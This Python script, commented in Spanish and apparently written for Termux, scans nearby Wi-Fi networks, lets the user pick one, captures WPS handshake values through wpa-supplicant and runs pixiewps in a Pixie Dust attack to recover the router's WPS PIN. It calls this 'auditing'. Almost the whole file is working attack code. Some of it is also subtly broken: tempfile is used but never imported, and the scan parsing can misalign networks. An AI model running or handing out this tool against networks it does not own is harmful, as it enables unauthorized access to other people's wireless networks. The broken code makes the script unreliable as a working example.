import subprocess
import re
import os
import time
from tabulate import tabulate

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode(), stderr.decode()
    else:
        print(stderr.decode())
        return stdout.decode(), stderr.decode()

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def is_valid_bssid(bssid):
    """Verifica si un BSSID es válido"""
    return re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", bssid) is not None

def scan_wifi(interface):
    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    intensidades = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssid = bssid.split('(')[0]  # Limpiar el BSSID
            if is_valid_bssid(bssid):
                bssids.append(bssid)
            else:
                bssids.append(None)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                channel = int((freq - 2407) / 5)
                canales.append(channel)
            except ValueError:
                canales.append(None)
        if "signal" in linea:
            signal = linea.split(':')[1].strip()
            intensidades.append(signal)
    return redes, bssids, canales, intensidades

def create_wpa_supplicant_conf(ssid):
    """Crea un archivo de configuración temporal para wpa-supplicant"""
    conf_content = f"""
network={{
    ssid=\"{ssid}\"
    key_mgmt=NONE
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def capture_wps_data(interface, ssid):
    """Captura los datos necesarios para el ataque Pixie Dust usando wpa-supplicant"""
    print(f"Capturando datos WPS de la red con SSID {ssid}...")
    conf_file = create_wpa_supplicant_conf(ssid)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa-supplicant"  # Ruta completa de wpa-supplicant
    wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
    print(f"Ejecutando wpa-supplicant: {wpa_supplicant_command}")
    stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)

    print("Salida de wpa-supplicant:")
    print(stdout)
    print(stderr)

    pke = extract_value(stdout, "PKE:")
    pkr = extract_value(stdout, "PKR:")
    ehash1 = extract_value(stdout, "E-Hash1:")
    ehash2 = extract_value(stdout, "E-Hash2:")
    authkey = extract_value(stdout, "AuthKey:")
    enonce = extract_value(stdout, "E-Nonce:")

    os.remove(conf_file)  # Eliminar el archivo de configuración temporal

    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
        return None, None, None, None, None, None

    return pke, pkr, ehash1, ehash2, authkey, enonce

def perform_pixie_dust_attack(interface, ssid):
    """Realiza el ataque Pixie Dust usando los datos de wpa-supplicant."""
    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")

    # Capturar los datos necesarios usando wpa-supplicant
    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        return

    # Ejecutar pixiewps con los valores capturados
    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
    print(f"Ejecutando pixiewps: {pixiewps_command}")
    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        output = process.stdout.readline()
        if output == b'' and process.poll() is not None:
            break
        if output:
            os.system('clear')
            print(output.strip().decode())
        time.sleep(0.1)

    pixie_stdout, pixie_stderr = process.communicate()

    print("Salida de pixiewps:")
    print(pixie_stdout.decode())
    print(pixie_stderr.decode())

    if "WPS pin:" in pixie_stdout.decode():
        pin = extract_value(pixie_stdout.decode(), "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        print(pixie_stdout.decode())
        return None

def check_tool_availability(tool):
    """Verifica la disponibilidad de una herramienta en el sistema"""
    result = subprocess.run(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def main():
    # Limpiar la pantalla al inicio del script
    os.system('clear')

    # Verificar la disponibilidad de las herramientas necesarias
    tools = ["iw", "/data/data/com.termux/files/usr/bin/wpa-supplicant"]
    for tool in tools:
        if not check_tool_availability(tool):
            print(f"Error: {tool} no está disponible en el sistema.")
            return

    # Utilizar la interfaz secundaria para el escaneo y el ataque
    scan_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el escaneo en tu dispositivo

    # Escanear redes Wi-Fi utilizando la interfaz secundaria
    redes, bssids, canales, intensidades = scan_wifi(scan_interface)
    if redes:
        print("Redes disponibles:")
        table = []
        for i, red in enumerate(redes):
            if bssids[i]:
                table.append([i + 1, red, bssids[i], canales[i], intensidades[i]])
        
        headers = ["#", "SSID", "BSSID", "Canal", "Intensidad"]
        print(tabulate(table, headers, tablefmt="grid"))
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        bssid_seleccionado = bssids[seleccion]
        canal_seleccionado = canales[seleccion]
        
        print(f"Red seleccionada: {red_seleccionada}")
        print(f"BSSID: {bssid_seleccionado}")
        print(f"Canal: {canal_seleccionado}")
        
        # Realizar el ataque Pixie Dust utilizando la interfaz secundaria
        perform_pixie_dust_attack(scan_interface, red_seleccionada)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()



